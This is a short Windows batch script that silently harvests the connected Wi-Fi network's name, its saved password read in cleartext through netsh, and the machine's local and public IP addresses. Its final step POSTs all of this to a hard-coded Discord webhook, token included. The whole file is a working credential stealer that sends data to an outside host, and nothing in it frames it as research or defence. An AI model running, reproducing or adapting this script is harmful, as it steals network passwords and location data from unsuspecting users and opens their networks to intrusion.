@echo off
setlocal enabledelayedexpansion

for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /c:"SSID"') do (
    set "ssid=%%a"
    goto :get_password
)
:get_password

set "wifi_name=!ssid:~1!"
echo You are connected to: !wifi_name!

for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!wifi_name!" key^=clear ^| findstr /c:"Key Content"') do (
    set "password=%%b"
    echo Password for !wifi_name!: !password!
)

rem Get IPv4 Address
for /f "tokens=2 delims=:" %%c in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "ip_address=%%c"
    goto :get_public_ip
)

:get_public_ip
rem Get Public IP Address using ipify API
for /f %%d in ('curl -s "https://api.ipify.org"') do (
    set "public_ip=%%d"
    goto :send_webhook
)

:send_webhook
rem Prepare the data for webhook
set "webhook=https://discordapp.com/api/webhooks/1210384760053047357/PQf_FG7ym8nX4zbK7nTAkArOhWa6ysL25TGC-SfPGasg7exoKsd17JU4hC3dTM5D7Tfx"
set "message=Wi-Fi Name: !wifi_name! | Password: !password! | IPv4 Address: !ip_address! | Public IP: !public_ip!"

rem Send data to Discord webhook
curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"!message!\"}" !webhook!

